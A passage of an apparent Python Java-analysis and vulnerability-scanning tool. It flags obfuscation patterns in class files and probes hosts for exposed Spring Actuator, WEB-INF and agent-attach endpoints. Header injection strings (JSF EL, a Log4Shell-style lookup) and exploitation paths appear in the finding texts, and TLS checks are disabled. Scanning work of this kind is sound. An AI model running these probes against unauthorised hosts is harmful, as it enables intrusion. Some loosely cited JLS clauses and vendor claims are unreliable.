                         'obfuscated names complicate static analysis and hide malicious intent; '
                         'fix: decompile with procyon or fernflower using a rename-mapping file '
                         'if available; otherwise audit all renamed call sites manually'),
            'host':     host,
            'port':     port,
        })

    # ── XOR string encryption ──────────────────────────────────────────────────
    # IXOR = 0x82 (integer XOR), LXOR = 0x83 (long XOR) — Chapter 2 opcode table
    xor_count = binary_data.count(b'\x82') + binary_data.count(b'\x83')

    if xor_count > 8:
        findings.append({
            'severity': 'HIGH',
            'title':    'JAVA_STRING_XOR_ENCRYPT — XOR opcode density (string encryption)',
            'detail':   (f'Found {xor_count} IXOR(0x82)/LXOR(0x83) opcodes; '
                         'high XOR density in Java bytecode indicates string encryption; '
                         'obfuscators such as Zelix KlassMaster and Stringer encrypt constant '
                         'pool strings and decrypt them at runtime via XOR loops, '
                         'defeating static string extraction; '
                         'fix: run the class in a controlled JVM and hook String.<init> '
                         'to capture decrypted values; or use JVM-Sandbox for dynamic analysis'),
            'host':     host,
            'port':     port,
        })

    # ── Reflective method invocation ───────────────────────────────────────────
    has_reflect_method = (b'java/lang/reflect/Method' in binary_data or
                          b'java.lang.reflect.Method' in binary_data)
    has_invoke         = b'invoke' in binary_data

    if has_reflect_method and has_invoke:
        findings.append({
            'severity': 'HIGH',
            'title':    'JAVA_REFLECTIVE_INVOKE — Reflection-based method invocation',
            'detail':   ('java.lang.reflect.Method and "invoke" detected; '
                         'obfuscators replace direct invokevirtual/invokestatic bytecodes '
                         'with Method.invoke() calls resolved at runtime to hide call targets '
                         'from static analysis; '
                         'this also appears in deserialization gadget chains and malicious loaders; '
                         'fix: audit all Method.invoke() call sites; '
                         'verify reflected class/method names against a known whitelist; '
                         'apply SecurityManager reflection restrictions'),
            'host':     host,
            'port':     port,
        })

    # ── Dynamic class definition ───────────────────────────────────────────────
    has_define_class = b'defineClass' in binary_data
    has_load_class   = b'loadClass' in binary_data
    # '[B' is the JVM field descriptor for byte[] (Chapter 2 field descriptor table)
    has_byte_array   = (b'[B' in binary_data or b'\x5b\x42' in binary_data)

    if (has_define_class or has_load_class) and has_byte_array:
        findings.append({
            'severity': 'CRITICAL',
            'title':    'JAVA_DYNAMIC_CLASS_DEFINE — Dynamic class definition from byte array',
            'detail':   ('defineClass or loadClass combined with byte-array ([B) descriptor; '
                         'ClassLoader.defineClass(byte[]) loads arbitrary class bytecode at '
                         'runtime from a byte array, enabling a hidden second-stage payload '
                         'that bypasses jar-level security scanning; '
                         'this is the primary dropper technique for JVM malware; '
                         'fix: prohibit dynamic class definition via SecurityManager; '
                         'audit all ClassLoader subclasses; '
                         'use JPMS module boundaries to restrict class loading'),
            'host':     host,
            'port':     port,
        })

    # ── String fragment obfuscation ────────────────────────────────────────────
    # Count very short (1-3 char) CONSTANT_Utf8 entries that look like fragments
    short_strings = _re.findall(b'\x01\x00[\x01\x02\x03][a-zA-Z0-9]{1,3}', binary_data)

    if len(short_strings) > 20:
        findings.append({
            'severity': 'MEDIUM',
            'title':    'JAVA_STRING_FRAGMENT_OBFUSCATION — String fragmentation obfuscation',
            'detail':   (f'Found {len(short_strings)} very short (1-3 char) UTF-8 constant pool '
                         'string entries; '
                         'obfuscators such as Allatori and Stringer split string literals into '
                         'fragments reassembled at runtime via StringBuilder.append() chains, '
                         'defeating static string extraction; '
                         'fix: instrument StringBuilder.toString() at runtime to capture '
                         'assembled strings; use java-deobfuscator or similar tooling'),
            'host':     host,
            'port':     port,
        })

    # ── Synthetic flag abuse ───────────────────────────────────────────────────
    # ACC_SYNTHETIC = 0x1000; appears in field_info/method_info access_flags (2-byte BE)
    # High-byte 0x10, low-byte 0x00 is the pattern to search
    synthetic_count = binary_data.count(b'\x10\x00')

    if synthetic_count > 5:
        findings.append({
            'severity': 'MEDIUM',
            'title':    'JAVA_SYNTHETIC_FLAG_ABUSE — ACC_SYNTHETIC flag overuse',
            'detail':   (f'Found {synthetic_count} occurrences of the 0x1000 (ACC_SYNTHETIC) '
                         'access flag pattern; '
                         'the ACC_SYNTHETIC flag marks compiler-generated members absent from '
                         'source (bridge methods, inner-class access bridges); '
                         'obfuscators deliberately set ACC_SYNTHETIC on user-defined methods '
                         'and fields to hide them from decompilers that skip synthetic members; '
                         'a high count outside expected inner-class patterns indicates '
                         'intentional obfuscation; '
                         'fix: use procyon -ss or fernflower -dgs=0 to show synthetic members'),
            'host':     host,
            'port':     port,
        })

    # ── GOTO spaghetti ─────────────────────────────────────────────────────────
    # GOTO opcode = 0xa7 — Chapter 2 opcode table; high density = spaghetti obfuscation
    goto_count   = binary_data.count(b'\xa7')
    file_size    = len(binary_data)
    goto_density = goto_count / max(file_size, 1)

    if goto_count > 10 and goto_density > 0.02:
        findings.append({
            'severity': 'MEDIUM',
            'title':    'JAVA_GOTO_OBFUSCATION — GOTO opcode spaghetti obfuscation',
            'detail':   (f'Found {goto_count} GOTO(0xa7) opcodes '
                         f'(density {goto_density:.3f} per byte, threshold 0.020); '
                         'obfuscators inject spurious GOTO instructions and split linear code '
                         'blocks into non-sequential fragments producing control flow graphs '
                         'that LL/LALR decompilers cannot reduce to structured Java '
                         '(as documented in Decompiling Java ch.5 strategy analysis); '
                         'fix: use JADX with CFG simplification; '
                         'apply Ramshaw\'s algorithm to convert gotos to structured loops'),
            'host':     host,
            'port':     port,
        })

    # ── Zero-byte class names ──────────────────────────────────────────────────
    # JVM spec requires modified UTF-8 for CONSTANT_Utf8 — null must be encoded
    # as 0xC0 0x80, not 0x00; raw null bytes in class name entries = tampered file
    # Pattern: CONSTANT_Utf8 tag (0x01) + short length + content containing 0x00
    zero_byte_names = _re.findall(b'\x01\x00.{1,2}\x00[a-zA-Z/]', binary_data, _re.DOTALL)

    if zero_byte_names:
        findings.append({
            'severity': 'HIGH',
            'title':    'JAVA_ZERO_BYTE_CLASS_NAME — Null byte in constant pool string',
            'detail':   (f'Found {len(zero_byte_names)} CONSTANT_Utf8 entries containing '
                         'embedded null bytes (0x00); '
                         'the JVM specification requires modified UTF-8 where 0x00 is encoded '
                         'as 0xC0 0x80, not a raw null byte; '
                         'null bytes in class names are an anti-parsing technique used by '
                         'malicious obfuscators: they cause ClassNotFoundException in some '
                         'class loaders while executing under others; '
                         'this is also a reliable indicator of a hand-crafted or tampered classfile; '
                         'fix: reject classfiles with raw null bytes in constant pool strings; '
                         'escalate to incident response'),
            'host':     host,
            'port':     port,
        })

    return findings


def probe_java_reflection_exposure(host: str, port: int = 443, timeout: float = 10.0) -> list:
    import urllib.request
    import ssl
    import json as _json

    findings = []
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    scheme = 'https' if port in (443, 8443, 9443) else 'http'

    def _get(path, extra_headers=None):
        url = f'{scheme}://{host}:{port}{path}'
        req = urllib.request.Request(url)
        req.add_header('Accept', 'application/json')
        req.add_header('User-Agent', 'Mozilla/5.0')
        if extra_headers:
            for k, v in extra_headers.items():
                req.add_header(k, v)
        try:
            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
                body = r.read(65536)
                return r.status, body
        except urllib.error.HTTPError as e:
            return e.code, b''
        except Exception:
            return None, b''

    status, body = _get('/actuator/beans')
    if status == 200 and body:
        try:
            parsed = _json.loads(body)
            bean_count = 0
            contexts = parsed.get('contexts', {})
            for ctx_name, ctx_val in contexts.items():
                bean_count += len(ctx_val.get('beans', {}))
            if bean_count == 0:
                bean_count = body.count(b'"type"')
        except Exception:
            bean_count = body.count(b'"type"')
        findings.append({
            'severity': 'HIGH',
            'title': 'JAVA_REFLECTION_ACTUATOR_BEANS — Spring Actuator /actuator/beans unauthenticated',
            'detail': (
                f'Unauthenticated read of /actuator/beans returned HTTP 200 with {bean_count} '
                'bean type references; full class names for all registered Spring beans are '
                'disclosed; JLS §12.2 specifies that binary class names are the lookup key for '
                'ClassLoader.loadClass() — an attacker with this list can construct targeted '
                'gadget chains without local classpath enumeration; known exploitation path: '
                'class name list -> commons-collections / spring-core deserialization gadget '
                'selection -> ysoserial payload generation; '
                'fix: expose actuator endpoints only behind authentication; '
                'set management.endpoints.web.exposure.include to a minimum approved set'
            ),
            'host': host,
            'port': port,
        })

    status, body = _get('/actuator/mappings')
    if status == 200 and body:
        route_count = body.count(b'"handler"')
        findings.append({
            'severity': 'MEDIUM',
            'title': 'JAVA_REFLECTION_ACTUATOR_MAPPINGS — Spring Actuator /actuator/mappings unauthenticated',
            'detail': (
                f'Unauthenticated read of /actuator/mappings returned HTTP 200 with approximately '
                f'{route_count} handler entries; URL-to-controller-method mapping is disclosed '
                'including request method, path pattern, and fully-qualified handler class; '
                'JLS §13.1 requires that binary names of referenced types be preserved in '
                'class files for dynamic linking — these names surface directly in mappings '
                'output; enables targeted fuzzing of internal admin endpoints not listed in '
                'any external interface specification; '
                'fix: restrict /actuator/mappings to authenticated management network; '
                'apply Spring Security to all actuator endpoints'
            ),
            'host': host,
            'port': port,
        })

    for jsf_path in ['/index.jsf', '/faces/index.xhtml', '/javax.faces.resource/']:
        status, body = _get(jsf_path, extra_headers={'X-JSF-Test': '#{facesContext.externalContext.requestMap}'})
        if status in (200, 302, 500) and body:
            if any(x in body for x in [b'javax.faces', b'jakarta.faces', b'FacesContext', b'xhtml']):
                findings.append({
                    'severity': 'HIGH',
                    'title': 'JAVA_REFLECTION_JSF_EL_SURFACE — JSF Expression Language injection surface detected',
                    'detail': (
                        f'JSF endpoint at {jsf_path} responded with JSF-indicative content '
                        '(javax.faces / FacesContext markers in body); '
                        'JSF unified EL evaluates #{...} expressions against the managed bean '
                        'registry via java.lang.reflect.Method.invoke(); '
                        'JLS §15.12.4 specifies that method invocation through reflection '
                        'bypasses compile-time access checks — arbitrary public method calls '
                        'on any registered bean are reachable from EL; '
                        'known vectors: #{facesContext.externalContext.requestMap}, '
                        '#{request.getClass().forName(\'java.lang.Runtime\')} patterns; '
                        'CVE-2013-3827 (GlassFish) and CVE-2011-2730 (Spring) are class-level '
                        'examples of this surface; '
                        'fix: upgrade JSF runtime; disable EL execution in display-only contexts; '
                        'apply input validation before EL evaluation'
                    ),
                    'host': host,
                    'port': port,
                })
                break

    jndi_headers = {
        'X-Api-Version': '${java:version}',
        'X-Forwarded-For': '${java:version}',
        'User-Agent': '${java:version}',
    }
    status, body = _get('/', extra_headers=jndi_headers)
    if status is not None and body:
        if b'java version' in body.lower() or b'jre' in body.lower() or b'jdk' in body.lower():
            findings.append({
                'severity': 'CRITICAL',
                'title': 'JAVA_REFLECTION_JNDI_LOOKUP_REFLECTED — JNDI expression ${java:version} reflected in response',
                'detail': (
                    'Request headers containing ${java:version} EL expression produced a '
                    'response body containing Java version string; '
                    'server is evaluating JNDI lookup expressions from user-supplied input; '
                    'JLS §12.4.1 specifies that class initialization is triggered on first '
                    'active use — JNDI lookup evaluation triggers class loading from the '
                    'configured InitialContext, which under log4j2 < 2.15 routes to '
                    'com.sun.jndi.ldap.LdapCtx enabling remote class load (Log4Shell, '
                    'CVE-2021-44228, CVSS 10.0); '
                    'Cisco ISE and Prime Infrastructure ship Java web containers where '
                    'this surface has been confirmed exploitable in prior advisories; '
                    'fix: upgrade log4j2 >= 2.17.1; set '
                    'log4j2.formatMsgNoLookups=true; filter ${ sequences at WAF'
                ),
                'host': host,
                'port': port,
            })

    return findings


def probe_java_classloader_exposure(host: str, port: int = 443, timeout: float = 10.0) -> list:
    import urllib.request
    import ssl

    findings = []
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    scheme = 'https' if port in (443, 8443, 9443) else 'http'

    def _get(path):
        url = f'{scheme}://{host}:{port}{path}'
        req = urllib.request.Request(url)
        req.add_header('User-Agent', 'Mozilla/5.0')
        try:
            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
                body = r.read(65536)
                return r.status, body
        except urllib.error.HTTPError as e:
            body = b''
            try:
                body = e.read(4096)
            except Exception:
                pass
            return e.code, body
        except Exception:
            return None, b''

    status, body = _get('/WEB-INF/classes/')
    if status == 200 and body:
        class_count = body.count(b'.class')
        findings.append({
            'severity': 'CRITICAL',
            'title': 'JAVA_CLASSLOADER_WEBINF_CLASSES — /WEB-INF/classes/ directory listing accessible',
            'detail': (
                f'/WEB-INF/classes/ returned HTTP 200 with approximately {class_count} .class '
                'file references; compiled bytecode is directly downloadable; '
                'JLS §12.2 specifies that .class files contain the full binary representation '
                'of the class including constant pool, method bytecode, field descriptors, '
                'and debug attributes (source file name, line number tables); '
                'downloaded class files can be disassembled with javap -c -verbose or '
                'decompiled with CFR/Procyon to recover near-source-level logic including '
                'authentication bypass conditions, hardcoded credentials in constant pool '
                'tag-8 (CONSTANT_String) entries, and SQL query templates; '
                'fix: configure web server to deny direct access to WEB-INF/; '
                'verify servlet container WEB-INF protection is not overridden by a '
                'static file handler or reverse proxy passthrough rule'
            ),
            'host': host,
            'port': port,
        })

    status, body = _get('/WEB-INF/lib/')
    if status == 200 and body:
        jar_count = body.count(b'.jar')
        findings.append({
            'severity': 'HIGH',
            'title': 'JAVA_CLASSLOADER_WEBINF_LIB — /WEB-INF/lib/ JAR listing accessible',
            'detail': (
                f'/WEB-INF/lib/ returned HTTP 200 with approximately {jar_count} JAR file '
                'references; dependency inventory is fully disclosed; '
                'JLS §12.2 specifies that ClassLoader implementations search the classpath '
                'sequentially — each JAR name and version in /WEB-INF/lib/ identifies a '
                'library loadable into the application classloader; '
                'disclosed JAR filenames (which typically embed version strings per Maven '
                'naming conventions: artifactId-version.jar) enable direct CVE matching '
                'without black-box fingerprinting; known high-value targets: '
                'commons-collections-3.x.jar (ysoserial CC gadget chains), '
                'log4j-core-2.x.jar (CVE-2021-44228), spring-core-4.x.jar (CVE-2022-22965); '
                'fix: deny directory listing under WEB-INF/; '
                'remove unused JARs; apply WAF rule to block /WEB-INF/ path prefix'
            ),
            'host': host,
            'port': port,
        })

    status, body = _get('/WEB-INF/web.xml')
    if status == 200 and body:
        servlet_count = body.count(b'<servlet')
        filter_count = body.count(b'<filter')
        findings.append({
            'severity': 'CRITICAL',
            'title': 'JAVA_CLASSLOADER_WEBXML — /WEB-INF/web.xml readable',
            'detail': (
                f'/WEB-INF/web.xml returned HTTP 200 containing approximately {servlet_count} '
                f'servlet and {filter_count} filter declarations; '
                'web.xml is the servlet deployment descriptor; it specifies '
                'servlet class names (enabling targeted class-file retrieval), '
                'security constraint paths and roles (mapping auth bypass targets), '
                'initialization parameters (which may contain credentials, DSN strings, '
                'or LDAP bind credentials as <param-value> elements), '
                'and filter chain order (identifying which requests bypass security filters); '
                'JLS §12.4 specifies that static initializers run on first class load — '
                'param-value strings read at init time and stored in static fields are '
                'present in heap dumps and visible here before any auth check runs; '
                'fix: configure web server to block /WEB-INF/ at the reverse proxy layer; '
                'verify DefaultServlet fileServingEnabled=false in Tomcat/WebSphere config'
            ),
            'host': host,
            'port': port,
        })

    for attach_path in ['/attach', '/jmx/attach', '/api/attach', '/profiler/attach']:
        status, body = _get(attach_path)
        if status in (200, 400, 405) and body:
            if any(x in body for x in [b'attach', b'agent', b'pid', b'jvm', b'instrument']):
                findings.append({
                    'severity': 'CRITICAL',
                    'title': f'JAVA_CLASSLOADER_AGENT_ATTACH — Java agent attach endpoint at {attach_path}',
                    'detail': (
                        f'Endpoint {attach_path} responded HTTP {status} with agent/attach/pid '
                        'markers in body; this surface exposes the Java Attach API '
                        '(com.sun.tools.attach.VirtualMachine.attach(pid)); '
                        'JLS §12.2 and the Instrumentation API (java.lang.instrument) allow '
                        'a loaded Java agent to call Instrumentation.redefineClasses() — '
                        'this replaces the bytecode of any already-loaded class in the '
                        'running JVM without restart, bypassing ClassLoader isolation '
                        'entirely since redefinition operates on the Class object directly; '
                        'profiling tools (JProfiler, YourKit, Async-Profiler) ship an HTTP '
                        'attach endpoint that is frequently left enabled on Cisco appliances '
                        'during performance troubleshooting and never disabled post-engagement; '
                        'exploitation: POST pid + agent JAR path -> arbitrary class '
                        'redefinition -> authentication logic replacement in-process; '
                        'fix: disable profiler HTTP interfaces in production; '
                        'restrict Attach API access via -XX:+DisableAttachMechanism'
                    ),
                    'host': host,
                    'port': port,
                })
                break

    return findings


# ── CLI ───────────────────────────────────────────────────────────────────────

if __name__ == '__main__':
    import sys
    import json

    if len(sys.argv) < 2:
        print("Usage: java_re.py <file.class|file.jar> [--json] [--scan]")
        sys.exit(0)

    target  = sys.argv[1]
    as_json = '--json' in sys.argv
    do_scan = '--scan' in sys.argv

    ana = JavaREAnalyzer(target)

    if do_scan:
        findings = ana.scan_system()
        print(f"Found {len(findings)} findings across system")
    else:
        result = ana.analyze()
        findings = result.get('findings', [])

    if as_json:
        print(json.dumps(findings, indent=2))
    else:
        print(ana.report())
